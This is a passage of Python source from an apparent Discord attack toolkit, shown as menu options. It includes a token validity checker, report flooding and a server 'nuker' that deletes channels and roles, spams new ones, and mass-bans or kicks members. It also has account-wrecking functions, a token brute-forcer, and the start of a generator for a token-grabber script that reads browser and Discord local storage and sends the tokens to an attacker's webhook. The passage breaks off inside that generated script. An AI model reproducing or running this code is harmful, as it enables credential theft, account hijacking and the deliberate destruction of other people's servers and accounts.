        def manager():
            if __name__ == "__main__":
                try:
                    checked = []
                    with open('tokens.txt', 'r') as tokens:
                        filtered = filter_tokens(tokens)
                        filtr = len(filtered)
                        for token in filtered:
                            if len(token) > 15 and token not in checked and checker(token) == True:
                                print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{token} Valid')
                                checked.append(token)
                            else:
                                print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}{token} Invalid')
                    if len(checked) > 0:
                        save = input(f'{len(checked)} Valid\nDo you want to Save only Valid tokens? (y/n): ').lower()
                        if save == 'y':
                            name = 'tokens'
                            with open(f'{name}.txt', 'w') as saveFile:
                                saveFile.write('\n'.join(checked))
                            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Tokens saved to {name}.txt file!')
                except:
                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error, cant open tokens.txt file...... :(!')


        start = input('press any key to start: ')
        start = manager()

        time.sleep(5)
        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()

    if choice == 12:
        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Online')
        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Do Not Disturb')
        print(f'{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Idle')
        onlinr = int(input('[?]> '))

        tuk = []

        tokens = open("tokens.txt", "r").read().splitlines()

        asc = asyncio.new_event_loop()
        asyncio.set_event_loop(asc)

        if onlinr == 1:
            for token in tokens:
                bottuk = discord.Client(status=discord.Status.online)
                asc.create_task(bottuk.start(token, bot=False))
                tuk.append(bottuk)
                print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')
        if onlinr == 2:
            for token in tokens:
                bottuk = discord.Client(status=discord.Status.do_not_disturb)
                asc.create_task(bottuk.start(token, bot=False))
                tuk.append(bottuk)
                print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')
        if onlinr == 3:
            for token in tokens:
                bottuk = discord.Client(status=discord.Status.idle)
                asc.create_task(bottuk.start(token, bot=False))
                tuk.append(bottuk)
                print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')

        threading.Thread(target=asc.run_forever).start()


        time.sleep(5)
        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()



    if choice == 13:


        print(f'''{Fore.LIGHTMAGENTA_EX}[1] {Fore.RESET}{Fore.MAGENTA}Bravery{Fore.RESET}
{Fore.LIGHTMAGENTA_EX}[2] {Fore.RESET}{Fore.LIGHTRED_EX}Brilliance{Fore.RESET}
{Fore.LIGHTMAGENTA_EX}[3] {Fore.RESET}{Fore.LIGHTCYAN_EX}Balance{Fore.RESET}
{Fore.LIGHTMAGENTA_EX}[4] {Fore.RESET}Leave The HypeSquad''')

        house = input("Choice: ")

        def hype(token):
            headers = {
                'Authorization': token,
                "accept": "*/*",
                "accept-language": "en-GB",
                "content-length": "90",
                "content-type": "application/json",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"

            }

            if house == "1":
                housefinal = '1'

            if house == "2":
                housefinal = '2'

            if house == "3":
                housefinal = '3'

            if house == '4':
                housefinal = None

            if house == '1' or '2' or '3':
                payload = {
                    'house_id': housefinal
                }
                rep = requests.post("https://discord.com/api/v9/hypesquad/online", json=payload, headers=headers)
                if rep.status_code == 204:
                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')
                else:
                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} Failed')


            if house == '4':
                payload = {
                    'house_id': housefinal
                }
                req = requests.delete('https://discord.com/api/v8/hypesquad/online', headers=headers, json=payload)
                if req.status_code == 204:
                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')
                else:
                    pass

            else:
                pass

        tokens = open('tokens.txt', 'r').read().splitlines()
        for token in tokens:
            threading.Thread(target=hype(token)).start()

        time.sleep(5)
        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()



    if choice == 14:
        def changenick(server, nickname, token):
            headers = {'authorization': token,
                        "accept": "*/*",
                        "accept-language": "en-GB",
                        "content-length": "90",
                        "content-type": "application/json",
                        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                        "origin": "https://discord.com",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                        "x-debug-options": "bugReporterEnabled",
                        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                    }
            r = requests.patch(f"https://discord.com/api/v9/guilds/{server}/members/@me/nick", headers=headers,
                                json={"nick": nickname})
            if r.status_code == 200:
                print(f'{Fore.LIGHTGREEN_EX}[+] Nickname changed{Fore.RESET}')
            if r.status_code != 200:
                print(f'{Fore.LIGHTRED_EX}[-] Cant change nickname {Fore.RESET}')



        tokens = open('tokens.txt', 'r').read().splitlines()
        server = input("Server ID: ")
        nick = input("Nickname: ")
        for token in tokens:
            threading.Thread(target=changenick, args=(server, nick, token)).start()

        time.sleep(5)
        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 15:


        sent = 0
        session = Session()
        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Illegal Content')
        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Harrassment')
        print(f'{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Spam or Phishing Links')
        print(f'{Fore.LIGHTMAGENTA_EX}[4]{Fore.RESET} Self harm')
        print(f'{Fore.LIGHTMAGENTA_EX}[5]{Fore.RESET} NSFW Content')


        tokeen = input("Token: ")
        headers = {'Authorization': tokeen, 'Content-Type': 'application/json'}
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if r.status_code == 200:
            pass
        else:
            print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Invalid Token{Fore.RESET}")
            input()
        id = input("Server ID: ")
        id1 = input("Channel ID: ")
        message = input("Message ID: ")
        reason = input("Option: ")


        def Main():
            global sent
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
                'Authorization': tokeen,
                'Content-Type': 'application/json'
            }


            payload = {
                'channel_id': id1,
                'guild_id': id,
                'message_id': message,
                'reason': reason
            }


            while True:
                sent = 0
                r = requests.post('https://discord.com/api/v9/report', headers=headers, json=payload)
                if r.status_code == 201:
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Sent Report{Fore.RESET} \n")
                    sent += 1


                elif r.status_code == 401:
                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token")
                    input()


                else:
                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Error")


        print()
        for i in range(50000):
            Thread(target=Main).start()

        time.sleep(5)
        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()



    if choice == 16:



        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Account server Nuker')
        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Bot server Nuker')


        choicee1 = int(input('[?]>'))


        if choicee1 == 1:
            token = input('Account Token: ')
            print(f'{Fore.LIGHTMAGENTA_EX}[1] {Fore.RESET}Nuker')
            print(f'{Fore.LIGHTMAGENTA_EX}[2] {Fore.RESET}MassBan/MassKick')
            choicr = int(input('[?]>'))


            if choicr == 1:

                intents = discord.Intents.all()
                intents.members = True

                headerrs = {'Authorization': f'{token}',
                            "accept": "*/*",
                            'origin': 'https://discord.com',
                            'sec - fetch - mode': 'cors',
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'sec - fetch - site': 'same - origin',
                            'x - debug - options': 'bugReporterEnabled',
                            'x - super - properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAyMTEzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ =='
                            }
                client = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=True, intents=intents)

                class UNuker:
                    def DeleteChannels(self, guild, channel):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headerrs)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Deleted Channel {channel}")
                                    break
                                else:
                                    break

                    def DeleteRoles(self, guild, role):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}",
                                                headers=headerrs)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Deleted Role {role}")
                                    break
                                else:
                                    break

                    async def Scrape(self):
                        guild = input(f'Guild ID: ')
                        await client.wait_until_ready()
                        guildOBJ = client.get_guild(int(guild))


                        channelcount = 0
                        with open('staff/channels.txt', 'w') as c:
                            for channel in guildOBJ.channels:
                                c.write(str(channel.id) + "\n")
                                channelcount += 1
                            c.close()

                        rolecount = 0
                        with open('staff/roles.txt', 'w') as r:
                            for role in guildOBJ.roles:
                                r.write(str(role.id) + "\n")
                                rolecount += 1
                            r.close()


                    def SpamChannels(self, guild, name):
                        while True:
                            json = {'name': name, 'type': 0}
                            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headerrs,
                                              json=json)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Created Channel ")
                                    break
                                else:
                                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant create channels')

                    def SpamRoles(self, guild, name):
                        while True:
                            json = {'name': name}
                            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headerrs,
                                              json=json)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Created Role ")
                                    break
                                else:
                                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant create roles')
                                    break


                    async def NukeStart(self):
                        server = input(f'Server ID: ')
                        chh = input(f"Channels Names: ")
                        cha = input(f"Channels Amount: ")
                        rn = input(f"Roles Names: ")
                        ra = input(f"Roles Amount: ")

                        channels = open('staff/channels.txt')
                        roles = open('staff/roles.txt')

                        for channel in channels:
                            threading.Thread(target=self.DeleteChannels, args=(server, channel,)).start()
                        for role in roles:
                            threading.Thread(target=self.DeleteRoles, args=(server, role,)).start()
                        for i in range(int(cha)):
                            threading.Thread(target=self.SpamChannels, args=(server, chh,)).start()
                        for i in range(int(ra)):
                            threading.Thread(target=self.SpamRoles, args=(server, rn,)).start()

                    async def Menu(self):
                        choice = input('Press Enter: ')
                        if choice == '':
                            await self.Scrape()
                            time.sleep(2)
                            await self.NukeStart()
                            time.sleep(2)
                            await self.Menu()

                    @client.event
                    async def on_ready(*Args):
                        await UNuker().Menu()

                    def Check(self):
                        try:
                            client.run(token, bot=False)
                        except:
                            print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} Invalid Token ')
                            input()
                            os._exit(0)

                if __name__ == "__main__":
                    UNuker().Check()

                time.sleep(5)
                exit = input('press any key: ')
                clear = lambda: os.system('cls')
                exit = clear()
                exit = spammer()
            if choicr == 2:
                print(f'{Fore.LIGHTRED_EX}Warning!{Fore.RESET} If you use MassBan or MassKick with a token where the mobile number is not verified, the token will be locked automatically and you will have to verify it.')

                intents = discord.Intents.all()
                intents.members = True

                headerrss = {'Authorization': f'{token}',
                            "accept": "*/*",
                            'origin': 'https://discord.com',
                            'sec - fetch - mode': 'cors',
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'sec - fetch - site': 'same - origin',
                            'x - debug - options': 'bugReporterEnabled',
                            'x - super - properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAyMTEzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ =='
                            }
                client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)

                client.remove_command("help")

                class MassBan:

                    def BanMembers(self, guild, member):
                        while True:
                            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}",
                                             headers=headerrss)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Banning {member}")
                                    break
                                else:
                                    break

                    def KickMembers(self, guild, member):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}",
                                                headers=headerrss)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Kicking {member}')
                                    break
                                else:
                                    break

                    async def Scrape(self):
                        guild = input(f'Server ID: ')
                        await client.wait_until_ready()
                        guildOBJ = client.get_guild(int(guild))
                        members = await guildOBJ.chunk()

                        try:
                            os.remove("staff/members.txt")
                        except:
                            pass

                        membercount = 0
                        with open('staff/members.txt', 'w') as m:
                            for member in members:
                                m.write(str(member.id) + "\n")
                                membercount += 1
                            print(f"Info: {membercount} Members")
                            m.close()



                    async def BanExecute(self):
                        guild = input(f'Server ID: ')
                        print()
                        members = open('staff/members.txt')
                        for member in members:
                            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
                        members.close()

                    async def KickExecute(self):
                        guild = input(f'Server ID: ')
                        print()
                        members = open('staff/members.txt')
                        for member in members:
                            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
                        members.close()

                    async def Menu(self):
                        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} MassBan')
                        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} MassKick')

                        choice = input(f'[?]>')
                        if choice == '1':
                            await self.Scrape()
                            time.sleep(3)
                            sure = input('MassBAN y/n?: ').lower()
                            if sure == 'y':
                                await self.BanExecute()
                                time.sleep(2)
                                await self.Menu()

                            if sure == 'n':
                                exit = input('press any key: ')
                                clear = lambda: os.system('cls')
                                exit = clear()
                                exit = spammer()

                        elif choice == '2':
                            await self.Scrape()
                            time.sleep(3)
                            sure = input('MassKick y/n?: ').lower()
                            if sure == 'y':
                                await self.KickExecute()
                                time.sleep(2)
                                await self.Menu()
                            if sure == 'n':
                                exit = input('press any key: ')
                                clear = lambda: os.system('cls')
                                exit = clear()
                                exit = spammer()


                    @client.event
                    async def on_ready(*args):
                        await MassBan().Menu()

                    def Startup(self):
                        try:
                            client.run(token, bot=False)


                        except:
                            print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} Invalid Token')
                            time.sleep(2)
                            exit = input('press any key: ')
                            clear = lambda: os.system('cls')
                            exit = clear()
                            exit = spammer()


                if __name__ == "__main__":
                    MassBan().Startup()

                time.sleep(5)
                exit = input('press any key: ')
                clear = lambda: os.system('cls')
                exit = clear()
                exit = spammer()


        if choicee1 == 2:
            TOKEN = input('Bot token: ')
            MAX_CHANNELS = 500
            print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Nuke')
            print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} MassBan')


            choicee = int(input('[?]>'))


            if choicee == 1:
                chanless = input('Channels names: ')
                spam = input('Message you wanna spam: ')
                print(f'{Fore.LIGHTMAGENTA_EX}For nuke write to chat: !Nuke{Fore.RESET}')
                client = commands.Bot(command_prefix="!")

                @client.command()
                async def Nuke(ctx):
                    await ctx.message.delete()
                    guild = ctx.guild

                    for role in guild.roles:
                        try:
                            await role.delete()
                            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{role.name} Has been deleted{Fore.RESET}')
                        except:
                            print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}{role.name} Has not been deleted')

                    for channel in guild.channels:
                        try:
                            await channel.delete()
                            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{channel.name} Has been deleted')
                        except:
                            print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant delete {channel}')

                    try:
                        for i in range(MAX_CHANNELS):
                            await guild.create_text_channel(chanless)
                            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{chanless} has been created')
                    except:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You havent got permission to create channels')

                @client.event
                async def on_guild_channel_create(channel):
                    while True:
                        try:
                            await channel.send(spam)
                            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} SPAMMIMG :)')

                        except:
                            print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant spam')

                def thread():
                    threading.Thread(target=on_guild_channel_create, args=(client.run(TOKEN))).start()

                thread()

                def thread2():
                    threading.Thread(target=Nuke, args=(client.run(TOKEN))).start()

                thread2()


            if choicee == 2:
                print(f'{Fore.LIGHTMAGENTA_EX}For for banning write to chat: !massban{Fore.RESET}')
                headers = {
                    "Authorization":
                        f"Bot {TOKEN}"
                }

                client2 = commands.Bot(
                    command_prefix='!',
                    intents=discord.Intents.all(),
                    help_command=None
                )

                @client2.command()
                async def massban(ctx):
                    await ctx.message.delete()
                    servr = ctx.guild.id

                    def mass_ban(i):
                        sessions = requests.Session()
                        sessions.put(
                            f"https://discord.com/api/v9/guilds/{servr}/bans/{i}",
                            headers=headers
                        )

                    for i in range(3):
                        for member in list(ctx.guild.members):
                            threading.Thread(
                                target=mass_ban,
                                args=(member.id,)
                            ).start()
                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done...')


                client2.run(TOKEN)




        time.sleep(5)
        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 17:

        tokenn = input("Account Token: ")

        print(f'''{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Server spam
{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Remove all friends
{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Block all friends
{Fore.LIGHTMAGENTA_EX}[4]{Fore.RESET} Spam settings
{Fore.LIGHTMAGENTA_EX}[5]{Fore.RESET} Leave all servers
{Fore.LIGHTMAGENTA_EX}[6]{Fore.RESET} Close all DMs
{Fore.LIGHTMAGENTA_EX}[7]{Fore.RESET} Send mass DM
{Fore.LIGHTMAGENTA_EX}[8]{Fore.RESET} Delete all personal Servers''')

        def generate_random_string(Ammount):
            string_returned = "".join(
                random.choice(string.ascii_letters) for i in range(0, Ammount)
            )
            return string_returned

        def servers(Token):
            headers = {"authorization": Token, "user-agent": "bruh6/9"}
            for count, i in enumerate(range(0, 25)):
                payload = {"name": generate_random_string(15)}
                spam_server_request = requests.post(
                    "https://discord.com/api/v9/guilds", headers=headers, json=payload
                )

        def remove_friends(Token):
            headers = {"authorization": Token, "user-agent": "bruh6/9"}
            remove_friends_request = requests.get(
                "https://discord.com/api/v9/users/@me/relationships", headers=headers
            ).json()
            for i in remove_friends_request:
                requests.delete(
                    f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
                    headers=headers,
                )
                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Removed Friend {i['id']}")

        def block_friends(Token):
            headers = {"authorization": Token, "user-agent": "bruh6/9"}
            json = {"type": 2}
            block_friends_request = requests.get(
                "https://discord.com/api/v9/users/@me/relationships", headers=headers
            ).json()
            for i in block_friends_request:
                requests.put(
                    f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
                    headers=headers,
                    json=json,
                )
                print(f"{Fore.LIGHTGREEN_EX}[+] Blocked Friend {i['id']} {Fore.RESET}")

        def settings(Token):
            print(f'{Fore.LIGHTGREEN_EX}[+] Starting{Fore.RESET}')
            for i in range(0, 100):
                headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
                condition_status = True
                payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": "ko",
                           "message_display_compact": condition_status, "explicit_content_filter": 2,
                           "default_guilds_restricted": condition_status,
                           "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status,
                                                   "mutual_guilds": condition_status},
                           "inline_embed_media": condition_status, "inline_attachment_media": condition_status,
                           "gif_auto_play": condition_status, "render_embeds": condition_status,
                           "render_reactions": condition_status, "animate_emoji": condition_status,
                           "convert_emoticons": condition_status, "animate_stickers": 1,
                           "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status,
                           "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status,
                           "stream_notifications_enabled": condition_status, "status": "idle",
                           "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
                requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
                condition_status = False
                payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": "bg",
                           "message_display_compact": condition_status, "explicit_content_filter": 0,
                           "default_guilds_restricted": condition_status,
                           "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status,
                                                   "mutual_guilds": condition_status},
                           "inline_embed_media": condition_status, "inline_attachment_media": condition_status,
                           "gif_auto_play": condition_status, "render_embeds": condition_status,
                           "render_reactions": condition_status, "animate_emoji": condition_status,
                           "convert_emoticons": condition_status, "animate_stickers": 2,
                           "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status,
                           "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status,
                           "stream_notifications_enabled": condition_status, "status": "dnd",
                           "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
                requests.patch("https://canary.discord.com/api/v9/users/@me/settings", headers=headers, json=payload)

        def server_leave(Token):
            headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
            leave_all_servers_request = requests.get(
                "https://discord.com/api/v9/users/@me/guilds", headers=headers
            ).json()
            for guild in leave_all_servers_request:
                requests.delete(
                    f"https://discord.com/api/v9/users/@me/guilds/{guild['id']}",
                    headers=headers,
                )
                print(f"{Fore.LIGHTGREEN_EX}[+] Left Guild: {guild['id']}{Fore.RESET}")

        def dms_close(Token):
            headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
            close_dm_request = requests.get(
                "https://discord.com/api/v9/users/@me/channels", headers=headers
            ).json()
            for channel in close_dm_request:
                requests.delete(
                    f"https://discord.com/api/v9/channels/{channel['id']}",
                    headers=headers,
                )

        def mass_dm(Token):
            message = input('Message: ')
            headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
            mass_dm_request = requests.get(
                "https://discord.com/api/v9/users/@me/channels", headers=headers
            ).json()
            for channel in mass_dm_request:
                json = {"content": message}
                time.sleep(1)
                requests.post(
                    f"https://discord.com/api/v9/channels/{channel['id']}/messages",
                    headers=headers,
                    data=json,
                )
                print(f"{Fore.LIGHTGREEN_EX} {channel['id']} Sent{Fore.RESET}")

        def delete_servers(Token):
            headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
            print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET} Deleting...")
            delete_personal_request = requests.get(
                "https://discord.com/api/v9/users/@me/guilds", headers=headers
            ).json()
            for i in delete_personal_request:
                requests.post(
                    f"https://discord.com/api/v9/guilds/{i['id']}/delete",
                    headers=headers,
                )
                print(i["id"])

        options = {
            "1": servers,
            "2": remove_friends,
            "3": block_friends,
            "4": settings,
            "5": server_leave,
            "6": dms_close,
            "7": mass_dm,
            "8": delete_servers
        }


        def main():
            choiceee = input("[?]> ")
            threading.Thread(target=options[choiceee](tokenn)).start()

        if __name__ == "__main__":
            while 1:
                main()

        time.sleep(5)

        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()




    if choice == 18:


        print('Do not do this without the permission of the person to whom the bruteforce attack is conducted.')

        id_to_token = base64.b64encode((input("Id of user: ")).encode("ascii"))
        id_to_token = str(id_to_token)[2:-1]


        def bruteforece():
            while id_to_token == id_to_token:
                token = id_to_token + '.' + ('').join(
                    random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
                            '').join(random.choices(string.ascii_letters + string.digits, k=25))


                headers = {'Authorization': token}


                login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                try:
                    if login.status_code == 200:
                        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} VALID' + ' ' + token)
                        f = open('grab.txt', "a+")
                        f.write(f'{token}\n')
                    else:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} INVALID' + ' ' + token)
                finally:
                    print('')


        def thread():
            while True:
                threading.Thread(target=bruteforece).start()


        thread()


        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()

    if choice == 19:
        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} File token grabber')
        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} QR code SCAM')
        coc = int(input('[?]> '))

        if coc == 1:
            web = input('Webhook URL: ')
            with open('TUK.py', 'x') as f:
                f.write('''
import os
from re import findall
from json import loads, dumps
from urllib.request import Request, urlopen
    
web1 = "''' + web + '''"
    
lc = os.getenv("LOCALAPPDATA")
rm = os.getenv("APPDATA")
PATHS = {
    "Discord": rm + "\\\\Discord",
    "Discord Canary": rm + "\\\\discordcanary",
    "Discord PTB": rm + "\\\\discordptb",
    "Google Chrome": lc + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
    "Opera": rm + "\\\\Opera Software\\\\Opera Stable"
}
    
    
def header(token=None):
    headers = {
        "Content-Type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
    }
    if token:
        headers.update({"Authorization": token})
    return headers
    
    
def da(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=header(token))).read().decode())
    except:
        pass
    
    
def tukan(path):
    path += "\\\\Local Storage\\\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
    
    
def grabber():
    em = []
    checked = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
